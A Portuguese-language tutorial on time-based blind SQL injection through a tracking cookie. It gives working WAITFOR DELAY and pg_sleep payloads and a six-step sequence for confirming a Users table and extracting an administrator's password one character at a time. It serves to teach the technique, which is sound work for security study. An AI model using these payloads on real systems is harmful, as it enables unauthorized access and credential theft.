# Explorando Blind SQL Injection através de Delays Condicionais

Blind SQL Injection (SQLi Cega) pode ser explorado em situações onde a aplicação não retorna diretamente os resultados da consulta SQL injetada, mas apresenta um comportamento diferente com base nas condições que a consulta encontra. Esta técnica permite que um atacante extraia informações sensíveis ao manipular as respostas da aplicação a partir de condições SQL injetadas.

### Exemplo de Exploração

Considere uma aplicação que utiliza cookies de rastreamento para coletar dados analíticos sobre o uso dos usuários. Os pedidos enviados para a aplicação incluem um cabeçalho de cookie, como o exemplo abaixo:

```http
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
```

Quando um pedido contendo o cookie `TrackingId` é processado, a aplicação utiliza a seguinte consulta SQL para verificar se o usuário é conhecido:

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```

Esta consulta é vulnerável a SQL Injection, mas os resultados da consulta não são retornados ao usuário. No entanto, a aplicação lança delays dependendo da consulta realizada. 

Esse comportamento permite que a vulnerabilidade de Blind SQL Injection seja explorada ao condicionar o lançamento de delays na aplicação com base em uma condição injetada.

### Como a Exploração Funciona

Para entender como essa exploração funciona, considere dois pedidos enviados à aplicação com os seguintes valores para o cookie `TrackingId`:

1. `…xyz'; IF (1=2) WAITFOR DELAY '0:0:10'--
2. `…xyz'; IF (1=1) WAITFOR DELAY '0:0:10'--

- **Primeiro valor:** A condição injetada 1=2 é falsa, então a consulta retorna resultados normalmente sem lançar nenhum delay.
- **Segundo valor:** A condição injetada 1=1 é verdadeira, então a consulta lança um dalay  de 10 segundos.

*A forma de lançar delayes difere em cada banco de dados. Para mais informações consultar o [SQLi Cheatsheet](SQLi%20Cheatsheet.md)

Esse padrão de respostas permite determinar a verdade de qualquer condição injetada, e possibilita a extração de dados, um pedaço por vez.

### Exemplo de Extração de Dados

Vamos supor que existe uma tabela chamada `Users` com as colunas `Username` e `Password`, e um usuário chamado `Administrator`. É possível determinar a senha desse usuário enviando uma série de entradas para testar cada caractere da senha, um por vez. O banco de dados utilizado neste exemplo é o Postgres.

**Passo 1:** Primeiramente valide se uma tabela `Users` existe:

```sql
xyz'%3BSELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM Users--
```


**Passo 2:** Em seguida valide se as colunas `Username` e `Password` existem na tabela `Users`.

```sql
xyz'%3BSELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM Users WHERE Username IS NOT NULL--
```


**Passo 3:** Em seguida valide se o usuário `Administrator` existe na tabela:

```sql
xyz'%3BSELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM Users WHERE Username='Administrator'--
```


**Passo 4:** Em seguida descubra o tamanho da senha do usuário `Administrador`:

```sql
xyz'%3BSELECT CASE WHEN (LENGTH(Password)=20) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM Users WHERE Username='Administrator'--
```


**Passo 5:** Descubra o primeiro caractere da senha:

```sql
xyz'%3BSELECT CASE WHEN (SUBSTRING(Password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM Users WHERE Username='Administrator'--
```


**Passo 6:** Repita o processo até encontrar todos os caracteres da senha:

```sql
xyz'%3BSELECT CASE WHEN (SUBSTRING(Password,2,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM Users WHERE Username='Administrator'--
```
